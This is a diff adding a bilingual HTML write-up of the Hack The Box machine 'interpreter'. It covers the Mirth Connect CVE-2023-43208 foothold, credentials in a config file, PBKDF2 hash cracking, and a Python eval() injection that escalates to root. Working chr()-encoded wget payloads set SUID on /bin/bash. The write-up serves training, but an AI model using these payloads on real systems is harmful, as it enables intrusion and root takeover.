@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>interpreter | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">interpreter</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ========== ENGLISH ========== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The target was running <strong>Mirth Connect 4.4.0</strong>, a healthcare integration platform
+                        by NextGen. This version is vulnerable to <strong>CVE-2023-43208</strong>, an unauthenticated
+                        RCE via insecure deserialization on the <code>/api/users</code> endpoint. By sending a crafted
+                        XML payload to that endpoint without any authentication, I obtained a reverse shell as the
+                        <code>mirth</code> user.</p>
+
+                    <p>Inside the application, I found database credentials in <code>conf/mirth.properties</code>. 
+                        Querying the local MariaDB instance, I extracted a PBKDF2-hashed password for the user
+                        <code>sedric</code>. After cracking it with Hashcat, I switched to that user and grabbed the
+                        user flag.</p>
+
+                    <p>For privilege escalation, a root-owned Python service (<code>notif.py</code>) was listening
+                        locally on port <code>54321</code>. It accepted XML patient data, extracted field values, and
+                        passed them unsanitised into an <code>eval()</code>-based f-string template. By injecting a
+                        Python expression into one of the XML fields — using <code>chr()</code> encoding to bypass the
+                        regex filter — I executed <code>chmod u+s /bin/bash</code> as root, then escalated via
+                        <code>bash -p</code>.</p>
+
+                    <p><strong>Technologies / Exploits:</strong> Mirth Connect CVE-2023-43208 unauthenticated RCE,
+                        PBKDF2WithHmacSHA256 hash cracking with Hashcat, Python <code>eval()</code> injection via
+                        unsanitised XML input, SUID bash escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <!-- Recon -->
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an Nmap scan to identify open ports and services on the target:</p>
+
+                <p><img src="./media/image2.png"
+                        alt="Nmap scan results showing open ports on the target machine including HTTP/HTTPS and other services" /></p>
+
+                <p>The scan reveals an HTTP/HTTPS service. Navigating to the web interface, I see the following landing
+                    page:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="Mirth Connect web interface landing page showing Launch, Download, and Access Secure Site options" /></p>
+
+                <p>The page presents three options: <em>Launch</em> downloads a file, <em>Download</em> leads to a
+                    lengthy bash installer script hosted at <a
+                        href="https://s3.amazonaws.com/downloads.mirthcorp.com/connect-client-launcher/mirth-administrator-launcher-latest-unix.sh">
+                        https://s3.amazonaws.com/downloads.mirthcorp.com/connect-client-launcher/mirth-administrator-launcher-latest-unix.sh</a>,
+                    and <em>Access Secure Site</em> redirects to port <code>443</code> where a login form is
+                    presented.</p>
+
+                <p>The software is clearly a professional, off-the-shelf product — <strong>Mirth Connect</strong> by
+                    NextGen Healthcare — so the first thing I do is look for known vulnerabilities.</p>
+
+                <!-- Vuln research -->
+                <h2>Vulnerability Research — CVE-2023-43208</h2>
+                <p>A quick search surfaces two critical CVEs from late 2023 affecting Mirth Connect: <a
+                        href="https://www.incibe.es/incibe-cert/alerta-temprana/avisos-sci/multiples-vulnerabilidades-en-mirth-connect-de-nextgen">
+                        https://www.incibe.es/incibe-cert/alerta-temprana/avisos-sci/multiples-vulnerabilidades-en-mirth-connect-de-nextgen</a>
+                </p>
+
+                <ul>
+                    <li><strong>CVE-2023-37679</strong> — the original insecure deserialization RCE</li>
+                    <li><strong>CVE-2023-43208</strong> — a bypass of the incomplete fix for the above, exploiting the
+                        same root cause through external dependency classes</li>
+                </ul>
+
+                <p>Before committing to an exploit, I verify which version is running:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#98c379;">"https://10.129.2.3/api/server/version"</span> <span style="color:#d19a66;">-H</span> <span style="color:#98c379;">"X-Requested-With: OpenAPI"</span> <span style="color:#d19a66;">-k</span></code></pre>
+
+                <pre><code class="language-plaintext">4.4.0</code></pre>
+
+                <p>Version <strong>4.4.0</strong> is vulnerable to CVE-2023-43208. Both CVEs share the same root cause:
+                    insecure deserialization in the HTTP <code>POST</code> handler of the <code>/api/users</code>
+                    endpoint, which can be reached <em>without authentication</em>. The newer CVE achieves exploitation
+                    via classes from external dependencies to route around the partial patch applied to the first one.
+                    The exploitation mechanism in both cases is identical: send a crafted XML payload to the unauthenticated
+                    endpoint that triggers RCE through the deserialization gadget chain.</p>
+
+                <!-- Initial Access -->
+                <h2>Initial Access — Unauthenticated RCE via CVE-2023-43208</h2>
+                <p>Several public exploits are available for this CVE. To confirm code execution, I test with
+                    <code>curl</code> and <code>ping</code> callbacks first — neither works in this environment — but a
+                    <code>wget</code> callback to my Python HTTP server confirms RCE:</p>
+
+                <pre><code class="language-plaintext">10.129.2.3 - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>With confirmed RCE, I send a BusyBox reverse shell and catch it on my listener, landing a shell as
+                    the <code>mirth</code> user.</p>
+
+                <!-- Post-exploit enum -->
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>With a foothold established, I do some initial enumeration. Checking locally listening ports:</p>
+
+                <pre><code class="language-plaintext">tcp   LISTEN   0   128   127.0.0.1:54321   0.0.0.0:*
+tcp   LISTEN   0   80    127.0.0.1:3306</code></pre>
+
+                <p>There is a MariaDB instance on <code>3306</code> and an unknown service on <code>54321</code>. I
+                    also notice the user <code>sedric</code> in <code>/home</code>.</p>
+
+                <h3>Database Credentials in mirth.properties</h3>
+                <p>Inside the Mirth Connect installation, the file <code>conf/mirth.properties</code> contains
+                    database credentials in plaintext:</p>
+
+                <pre><code class="language-properties"><span style="color:#c678dd;"># keystore</span>
+<span style="color:#e06c75;">keystore.path</span>     = ${dir.appdata}/keystore.jks
+<span style="color:#e06c75;">keystore.storepass</span> = <span style="color:#98c379;">5GbU5HGTOOgE</span>
+<span style="color:#e06c75;">keystore.keypass</span>  = <span style="color:#98c379;">tAuJfQeXdnPw</span>
+<span style="color:#e06c75;">keystore.type</span>     = JCEKS
+
+<span style="color:#e06c75;">database.url</span>      = jdbc:mariadb://localhost:3306/mc_bdd_prod
+<span style="color:#c678dd;"># database credentials</span>
+<span style="color:#e06c75;">database.username</span> = <span style="color:#98c379;">mirthdb</span>
+<span style="color:#e06c75;">database.password</span> = <span style="color:#98c379;">MirthPass123!</span></code></pre>
+
+                <h3>Extracting and Cracking sedric's Password Hash</h3>
+                <p>Connecting to MariaDB with those credentials, I query the user table and find an entry for
+                    <code>sedric</code> with the following Base64-encoded value:</p>
+
+                <pre><code class="language-plaintext">u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==</code></pre>
+
+                <p>Mirth Connect stores passwords as Base64-encoded blobs where the salt and hash are concatenated
+                    together. I write a small Python script to separate them:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span> base64er.py</code></pre>
+
+                <pre><code class="language-plaintext">Salt: bbff8b0413949da7
+Hash: 62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
+
+Salt b64: u/+LBBOUnac=
+Hash b64: YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=</code></pre>
+
+                <p>Mirth Connect 4.4.0 uses <strong>PBKDF2WithHmacSHA256</strong> with <strong>600,000
+                        iterations</strong>. Formatting it for Hashcat and running it against a wordlist, the hash
+                    cracks shortly:</p>
+
+                <pre><code class="language-plaintext">sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1</code></pre>
+
+                <p>Using the cracked password, I switch to <code>sedric</code> and retrieve the user flag.</p>
+
+                <!-- Privesc -->
+                <h2>Privilege Escalation — Python eval() Injection via Unsanitised XML</h2>
+                <p>Running <code>ps -fauxww</code>, I spot a Python process running as root:</p>
+
+                <pre><code class="language-plaintext">root   3521   0.0   0.8   113604   34248   ?   Ss   0:01   /usr/bin/python3 /usr/local/bin/notif.py</code></pre>
+
+                <p>This is the service behind the locally-open port <code>54321</code>. Reading the source:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">#!/usr/bin/env python3</span>
+<span style="color:#7f848e;">"""
+Notification server for added patients.
+Listens for XML messages containing patient information and writes
+formatted notifications to /var/secure-health/patients/.
+Designed to run locally, accepting pre-formatted data from MirthConnect.
+"""</span>
+
+<span style="color:#c678dd;">from</span> flask <span style="color:#c678dd;">import</span> Flask, request, abort
+<span style="color:#c678dd;">import</span> re, uuid
+<span style="color:#c678dd;">from</span> datetime <span style="color:#c678dd;">import</span> datetime
+<span style="color:#c678dd;">import</span> xml.etree.ElementTree <span style="color:#c678dd;">as</span> ET, os
+
+app = Flask(__name__)
+
+USER_DIR = <span style="color:#98c379;">"/var/secure-health/patients/"</span>
+os.makedirs(USER_DIR, exist_ok=<span style="color:#d19a66;">True</span>)
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">template</span>(first, last, sender, ts, dob, gender):
+    pattern = re.compile(<span style="color:#98c379;">r"^[a-zA-Z0-9._'\"(){}=+/]+$"</span>)
+    <span style="color:#c678dd;">for</span> s <span style="color:#c678dd;">in</span> [first, last, sender, ts, dob, gender]:
+        <span style="color:#c678dd;">if not</span> pattern.fullmatch(s):
+            <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"[INVALID_INPUT]"</span>
+
+    <span style="color:#7f848e;"># DOB format is DD/MM/YYYY</span>
+    <span style="color:#c678dd;">try</span>:
+        year_of_birth = <span style="color:#61afef;">int</span>(dob.split(<span style="color:#98c379;">'/'</span>)[<span style="color:#d19a66;">-1</span>])
+        <span style="color:#c678dd;">if</span> year_of_birth &lt; <span style="color:#d19a66;">1900</span> <span style="color:#c678dd;">or</span> year_of_birth &gt; datetime.now().year:
+            <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"[INVALID_DOB]"</span>
+    <span style="color:#c678dd;">except</span>:
+        <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"[INVALID_DOB]"</span>
+
+    template = <span style="color:#98c379;">f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"</span>
+    <span style="color:#c678dd;">try</span>:
+        <span style="color:#c678dd;">return</span> <span style="color:#61afef;">eval</span>(<span style="color:#98c379;">f"f'''{template}'''"</span>)
+    <span style="color:#c678dd;">except</span> Exception <span style="color:#c678dd;">as</span> e:
+        <span style="color:#c678dd;">return</span> <span style="color:#98c379;">f"[EVAL_ERROR] {e}"</span>
+
+@app.route(<span style="color:#98c379;">"/addPatient"</span>, methods=[<span style="color:#98c379;">"POST"</span>])
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">receive</span>():
+    <span style="color:#c678dd;">if</span> request.remote_addr != <span style="color:#98c379;">"127.0.0.1"</span>:
+        abort(<span style="color:#d19a66;">403</span>)
+    <span style="color:#c678dd;">try</span>:
+        xml_text = request.data.decode()
+        xml_root = ET.fromstring(xml_text)
+    <span style="color:#c678dd;">except</span> ET.ParseError:
+        <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"XML ERROR\n"</span>, <span style="color:#d19a66;">400</span>
+
+    patient = xml_root <span style="color:#c678dd;">if</span> xml_root.tag == <span style="color:#98c379;">"patient"</span> <span style="color:#c678dd;">else</span> xml_root.find(<span style="color:#98c379;">"patient"</span>)
+    <span style="color:#c678dd;">if</span> patient <span style="color:#c678dd;">is</span> <span style="color:#d19a66;">None</span>:
+        <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"No &lt;patient&gt; tag found\n"</span>, <span style="color:#d19a66;">400</span>
+
+    id = uuid.uuid4().hex
+    data = {tag: (patient.findtext(tag) <span style="color:#c678dd;">or</span> <span style="color:#98c379;">""</span>) <span style="color:#c678dd;">for</span> tag <span style="color:#c678dd;">in</span>
+            [<span style="color:#98c379;">"firstname"</span>, <span style="color:#98c379;">"lastname"</span>, <span style="color:#98c379;">"sender_app"</span>, <span style="color:#98c379;">"timestamp"</span>, <span style="color:#98c379;">"birth_date"</span>, <span style="color:#98c379;">"gender"</span>]}
+
+    notification = template(
+        data[<span style="color:#98c379;">"firstname"</span>], data[<span style="color:#98c379;">"lastname"</span>], data[<span style="color:#98c379;">"sender_app"</span>],
+        data[<span style="color:#98c379;">"timestamp"</span>], data[<span style="color:#98c379;">"birth_date"</span>], data[<span style="color:#98c379;">"gender"</span>]
+    )
+
+    path = os.path.join(USER_DIR, <span style="color:#98c379;">f"{id}.txt"</span>)
+    <span style="color:#c678dd;">with</span> <span style="color:#61afef;">open</span>(path, <span style="color:#98c379;">"w"</span>) <span style="color:#c678dd;">as</span> f:
+        f.write(notification + <span style="color:#98c379;">"\n"</span>)
+    <span style="color:#c678dd;">return</span> notification
+
+<span style="color:#c678dd;">if</span> __name__ == <span style="color:#98c379;">"__main__"</span>:
+    app.run(<span style="color:#98c379;">"127.0.0.1"</span>, <span style="color:#d19a66;">54321</span>, threaded=<span style="color:#d19a66;">True</span>)</code></pre>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability is subtle but critical. The <code>template()</code> function applies a regex
+                    whitelist check on each field value, then builds a Python f-string and passes it to
+                    <code>eval()</code>. The regex allows the characters <code>{ }</code> and <code>( )</code>, which
+                    are exactly what is needed to inject Python expressions inside an f-string context. Any value that
+                    contains <code>{some_expression}</code> will be evaluated as Python code by <code>eval()</code> when
+                    the template string is constructed.</p>
+
+                <p>The catch is that characters like spaces, semicolons, and angle brackets are blocked by the regex.
+                    To bypass this, I encode the shell command character by character using Python's
+                    <code>chr()</code> function — which is made of alphanumeric characters and parentheses, all allowed
+                    by the regex — and concatenate them with <code>+</code>, also whitelisted.</p>
+
+                <p>Note that <code>curl</code> is not available on this machine, so I use <code>wget</code> to make the
+                    POST requests.</p>
+
+                <h3>Proof of Concept — Confirming RCE</h3>
+                <p>First, I test with a simple <code>touch /tmp/xd</code> to confirm execution. The chr() sequence
+                    encodes <code>touch /tmp/xd</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">wget</span> -q -O- \
+  <span style="color:#d19a66;">--post-data</span>=<span style="color:#98c379;">'&lt;patient&gt;
+&lt;firstname&gt;{__import__("os").popen(chr(116)+chr(111)+chr(117)+chr(99)+chr(104)+chr(32)+chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(120)+chr(100)).read()}&lt;/firstname&gt;
+&lt;lastname&gt;A&lt;/lastname&gt;
+&lt;sender_app&gt;B&lt;/sender_app&gt;
+&lt;timestamp&gt;C&lt;/timestamp&gt;
+&lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;
+&lt;gender&gt;M&lt;/gender&gt;
+&lt;/patient&gt;'</span> \
+  <span style="color:#d19a66;">--header</span>=<span style="color:#98c379;">'Content-Type: application/xml'</span> \
+  http://127.0.0.1:54321/addPatient</code></pre>
+
+                <p>Checking the result confirms the file was created by root:</p>
+
+                <pre><code class="language-plaintext">-rw-r--r-- 1 root root 0 Feb 21 17:19 xd</code></pre>
+
+                <h3>Escalating to Root — SUID on /bin/bash</h3>
+                <p>Now I craft the actual privilege escalation payload. The chr() sequence encodes
+                    <code>chmod u+s /bin/bash</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">wget</span> -q -O- \
+  <span style="color:#d19a66;">--post-data</span>=<span style="color:#98c379;">'&lt;patient&gt;
+&lt;firstname&gt;{__import__("os").popen(chr(99)+chr(104)+chr(109)+chr(111)+chr(100)+chr(32)+chr(117)+chr(43)+chr(115)+chr(32)+chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104)).read()}&lt;/firstname&gt;
+&lt;lastname&gt;A&lt;/lastname&gt;
+&lt;sender_app&gt;B&lt;/sender_app&gt;
+&lt;timestamp&gt;C&lt;/timestamp&gt;
+&lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;
+&lt;gender&gt;M&lt;/gender&gt;
+&lt;/patient&gt;'</span> \
+  <span style="color:#d19a66;">--header</span>=<span style="color:#98c379;">'Content-Type: application/xml'</span> \
+  http://127.0.0.1:54321/addPatient</code></pre>
+
+                <p>After the request completes, I verify the SUID bit was set on <code>/bin/bash</code> and escalate:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> -lah /bin/bash</code></pre>
+
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1.3M Sep  6 18:07 /bin/bash</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">bash</span> -p</code></pre>
+
+                <pre><code class="language-plaintext">bash-5.2# whoami
+root</code></pre>
+
+                <p>Root shell obtained. The root flag is now accessible.</p>
+            </div>
+
+            <!-- ========== ESPAÑOL ========== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina objetivo ejecutaba <strong>Mirth Connect 4.4.0</strong>, una plataforma de
+                        integración sanitaria de NextGen. Esta versión es vulnerable a
+                        <strong>CVE-2023-43208</strong>, un RCE no autenticado mediante deserialización insegura en el
+                        endpoint <code>/api/users</code>. Enviando un payload XML manipulado a dicho endpoint sin
+                        ningún tipo de autenticación, obtuve una reverse shell como el usuario
+                        <code>mirth</code>.</p>
+
+                    <p>Dentro de la aplicación, encontré credenciales de base de datos en
+                        <code>conf/mirth.properties</code>. Consultando la instancia local de MariaDB, extraje la
+                        contraseña hasheada con PBKDF2 del usuario <code>sedric</code>. Tras crackearla con Hashcat,
+                        cambié a ese usuario y obtuve la flag de usuario.</p>
+
+                    <p>Para la escalada de privilegios, un servicio Python propiedad de root
+                        (<code>notif.py</code>) escuchaba localmente en el puerto <code>54321</code>. Aceptaba datos
+                        XML de pacientes, extraía los valores de los campos y los pasaba sin sanear a un template de
+                        f-string basado en <code>eval()</code>. Inyectando una expresión Python en uno de los campos
+                        XML — usando la codificación con <code>chr()</code> para evadir el filtro regex — ejecuté
+                        <code>chmod u+s /bin/bash</code> como root y escalé mediante <code>bash -p</code>.</p>
+
+                    <p><strong>Tecnologías / Exploits:</strong> Mirth Connect CVE-2023-43208 RCE no autenticado,
+                        crackeo de hash PBKDF2WithHmacSHA256 con Hashcat, inyección Python en <code>eval()</code>
+                        mediante XML sin sanear, escalada vía SUID en bash.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <!-- Recon -->
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de Nmap para identificar puertos abiertos y servicios en el objetivo:</p>
+
+                <p><img src="./media/image2.png"
+                        alt="Resultados del escaneo Nmap mostrando los puertos abiertos en la máquina objetivo, incluyendo servicios HTTP/HTTPS" /></p>
+
+                <p>El escaneo revela un servicio HTTP/HTTPS. Al navegar a la interfaz web, veo la siguiente página de
+                    inicio:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="Página de inicio de Mirth Connect mostrando las opciones Launch, Download y Access Secure Site" /></p>
+
+                <p>La página presenta tres opciones: <em>Launch</em> descarga un archivo, <em>Download</em> lleva a un
+                    extenso script bash instalador alojado en <a
+                        href="https://s3.amazonaws.com/downloads.mirthcorp.com/connect-client-launcher/mirth-administrator-launcher-latest-unix.sh">
+                        https://s3.amazonaws.com/downloads.mirthcorp.com/connect-client-launcher/mirth-administrator-launcher-latest-unix.sh</a>,
+                    y <em>Access Secure Site</em> redirige al puerto <code>443</code> donde se presenta un formulario
+                    de login.</p>
+
+                <p>El software es claramente un producto profesional comercial — <strong>Mirth Connect</strong> de
+                    NextGen Healthcare — así que lo primero que hago es buscar vulnerabilidades conocidas.</p>
+
+                <!-- Vuln research -->
+                <h2>Investigación de Vulnerabilidades — CVE-2023-43208</h2>
+                <p>Una búsqueda rápida encuentra dos CVEs críticos de finales de 2023 que afectan a Mirth Connect: <a
+                        href="https://www.incibe.es/incibe-cert/alerta-temprana/avisos-sci/multiples-vulnerabilidades-en-mirth-connect-de-nextgen">
+                        https://www.incibe.es/incibe-cert/alerta-temprana/avisos-sci/multiples-vulnerabilidades-en-mirth-connect-de-nextgen</a>
+                </p>
+
+                <ul>
+                    <li><strong>CVE-2023-37679</strong> — el RCE original por deserialización insegura</li>
+                    <li><strong>CVE-2023-43208</strong> — un bypass del parche incompleto del anterior, explotando la
+                        misma causa raíz a través de clases de dependencias externas</li>
+                </ul>
+
+                <p>Antes de lanzar un exploit, verifico qué versión está corriendo:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#98c379;">"https://10.129.2.3/api/server/version"</span> <span style="color:#d19a66;">-H</span> <span style="color:#98c379;">"X-Requested-With: OpenAPI"</span> <span style="color:#d19a66;">-k</span></code></pre>
+
+                <pre><code class="language-plaintext">4.4.0</code></pre>
+
+                <p>La versión <strong>4.4.0</strong> es vulnerable a CVE-2023-43208. Ambos CVEs comparten la misma
+                    causa raíz: deserialización insegura en el handler HTTP <code>POST</code> del endpoint
+                    <code>/api/users</code>, al que se puede acceder <em>sin autenticación</em>. El CVE más reciente
+                    logra la explotación mediante clases de dependencias externas para rodear el parche parcial
+                    aplicado al primero. El mecanismo de explotación en ambos casos es idéntico: enviar un payload XML
+                    manipulado al endpoint no autenticado que desencadena RCE a través de la cadena de gadgets de
+                    deserialización.</p>
+
+                <!-- Initial Access -->
+                <h2>Acceso Inicial — RCE No Autenticado vía CVE-2023-43208</h2>
+                <p>Hay varios exploits públicos disponibles para este CVE. Para confirmar la ejecución de código,
+                    pruebo primero con callbacks de <code>curl</code> y <code>ping</code> — ninguno funciona en este
+                    entorno — pero un callback con <code>wget</code> a mi servidor HTTP Python confirma el RCE:</p>
+
+                <pre><code class="language-plaintext">10.129.2.3 - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>Con RCE confirmado, envío una reverse shell con BusyBox y la capturo en mi listener, obteniendo una
+                    shell como el usuario <code>mirth</code>.</p>
+
+                <!-- Post-exploit enum -->
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Con el acceso establecido, hago una enumeración inicial. Compruebo los puertos que escuchan
+                    localmente:</p>
+
+                <pre><code class="language-plaintext">tcp   LISTEN   0   128   127.0.0.1:54321   0.0.0.0:*
+tcp   LISTEN   0   80    127.0.0.1:3306</code></pre>
+
+                <p>Hay una instancia de MariaDB en el puerto <code>3306</code> y un servicio desconocido en
+                    <code>54321</code>. También observo al usuario <code>sedric</code> en <code>/home</code>.</p>
+
+                <h3>Credenciales de Base de Datos en mirth.properties</h3>
+                <p>Dentro de la instalación de Mirth Connect, el archivo <code>conf/mirth.properties</code> contiene
+                    credenciales de base de datos en texto plano:</p>
+
+                <pre><code class="language-properties"><span style="color:#c678dd;"># keystore</span>
+<span style="color:#e06c75;">keystore.path</span>     = ${dir.appdata}/keystore.jks
+<span style="color:#e06c75;">keystore.storepass</span> = <span style="color:#98c379;">5GbU5HGTOOgE</span>
+<span style="color:#e06c75;">keystore.keypass</span>  = <span style="color:#98c379;">tAuJfQeXdnPw</span>
+<span style="color:#e06c75;">keystore.type</span>     = JCEKS
+
+<span style="color:#e06c75;">database.url</span>      = jdbc:mariadb://localhost:3306/mc_bdd_prod
+<span style="color:#c678dd;"># database credentials</span>
+<span style="color:#e06c75;">database.username</span> = <span style="color:#98c379;">mirthdb</span>
+<span style="color:#e06c75;">database.password</span> = <span style="color:#98c379;">MirthPass123!</span></code></pre>
+
+                <h3>Extrayendo y Crackeando el Hash de sedric</h3>
+                <p>Conectándome a MariaDB con esas credenciales, consulto la tabla de usuarios y encuentro una entrada
+                    para <code>sedric</code> con el siguiente valor codificado en Base64:</p>
+
+                <pre><code class="language-plaintext">u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==</code></pre>
+
+                <p>Mirth Connect almacena las contraseñas como blobs en Base64 donde el salt y el hash van
+                    concatenados. Escribo un pequeño script Python para separarlos:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span> base64er.py</code></pre>
+
+                <pre><code class="language-plaintext">Salt: bbff8b0413949da7
+Hash: 62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
+
+Salt b64: u/+LBBOUnac=
+Hash b64: YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=</code></pre>
+
+                <p>Mirth Connect 4.4.0 usa <strong>PBKDF2WithHmacSHA256</strong> con <strong>600.000
+                        iteraciones</strong>. Formateándolo para Hashcat y lanzándolo contra un diccionario, el hash
+                    crackea en poco tiempo:</p>
+
+                <pre><code class="language-plaintext">sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1</code></pre>
+
+                <p>Con la contraseña crackeada, cambio al usuario <code>sedric</code> y obtengo la flag de usuario.</p>
+
+                <!-- Privesc -->
+                <h2>Escalada de Privilegios — Inyección en eval() Python vía XML Sin Sanear</h2>
+                <p>Ejecutando <code>ps -fauxww</code>, identifico un proceso Python corriendo como root:</p>
+
+                <pre><code class="language-plaintext">root   3521   0.0   0.8   113604   34248   ?   Ss   0:01   /usr/bin/python3 /usr/local/bin/notif.py</code></pre>
+
+                <p>Es el servicio que hay detrás del puerto <code>54321</code> abierto localmente. Leo el código
+                    fuente:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">#!/usr/bin/env python3</span>
+<span style="color:#7f848e;">"""
+Servidor de notificaciones para pacientes añadidos.
+Escucha mensajes XML con información de pacientes y escribe
+notificaciones formateadas en /var/secure-health/patients/.
+Diseñado para ejecutarse localmente, aceptando datos pre-formateados de MirthConnect.
+"""</span>
+
+<span style="color:#c678dd;">from</span> flask <span style="color:#c678dd;">import</span> Flask, request, abort
+<span style="color:#c678dd;">import</span> re, uuid
+<span style="color:#c678dd;">from</span> datetime <span style="color:#c678dd;">import</span> datetime
+<span style="color:#c678dd;">import</span> xml.etree.ElementTree <span style="color:#c678dd;">as</span> ET, os
+
+app = Flask(__name__)
+
+USER_DIR = <span style="color:#98c379;">"/var/secure-health/patients/"</span>
+os.makedirs(USER_DIR, exist_ok=<span style="color:#d19a66;">True</span>)
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">template</span>(first, last, sender, ts, dob, gender):
+    pattern = re.compile(<span style="color:#98c379;">r"^[a-zA-Z0-9._'\"(){}=+/]+$"</span>)
+    <span style="color:#c678dd;">for</span> s <span style="color:#c678dd;">in</span> [first, last, sender, ts, dob, gender]:
+        <span style="color:#c678dd;">if not</span> pattern.fullmatch(s):
+            <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"[INVALID_INPUT]"</span>
+
+    <span style="color:#7f848e;"># El formato de DOB es DD/MM/YYYY</span>
+    <span style="color:#c678dd;">try</span>:
+        year_of_birth = <span style="color:#61afef;">int</span>(dob.split(<span style="color:#98c379;">'/'</span>)[<span style="color:#d19a66;">-1</span>])
+        <span style="color:#c678dd;">if</span> year_of_birth &lt; <span style="color:#d19a66;">1900</span> <span style="color:#c678dd;">or</span> year_of_birth &gt; datetime.now().year:
+            <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"[INVALID_DOB]"</span>
+    <span style="color:#c678dd;">except</span>:
+        <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"[INVALID_DOB]"</span>
+
+    template = <span style="color:#98c379;">f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"</span>
+    <span style="color:#c678dd;">try</span>:
+        <span style="color:#c678dd;">return</span> <span style="color:#61afef;">eval</span>(<span style="color:#98c379;">f"f'''{template}'''"</span>)
+    <span style="color:#c678dd;">except</span> Exception <span style="color:#c678dd;">as</span> e:
+        <span style="color:#c678dd;">return</span> <span style="color:#98c379;">f"[EVAL_ERROR] {e}"</span>
+
+@app.route(<span style="color:#98c379;">"/addPatient"</span>, methods=[<span style="color:#98c379;">"POST"</span>])
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">receive</span>():
+    <span style="color:#c678dd;">if</span> request.remote_addr != <span style="color:#98c379;">"127.0.0.1"</span>:
+        abort(<span style="color:#d19a66;">403</span>)
+    <span style="color:#c678dd;">try</span>:
+        xml_text = request.data.decode()
+        xml_root = ET.fromstring(xml_text)
+    <span style="color:#c678dd;">except</span> ET.ParseError:
+        <span style="color:#c678dd;">return</span> <span style="color:#98c379;">"XML ERROR\n"</span>, <span style="color:#d19a66;">400</span>
+
+    patient = xml_root <span style="color:#c678dd;">if</span> xml_root.tag == <span style="color:#98c379;">"patient"</span> <span style="color:#c678dd;">else</span> xml_root.find(<span style="color:#98c379;">"patient"</span>)
+    <span style="color:#c678dd;">if</span> patient <span style="color:#c678dd;">is</span> <span style="color:#d19a66;">None</span>:
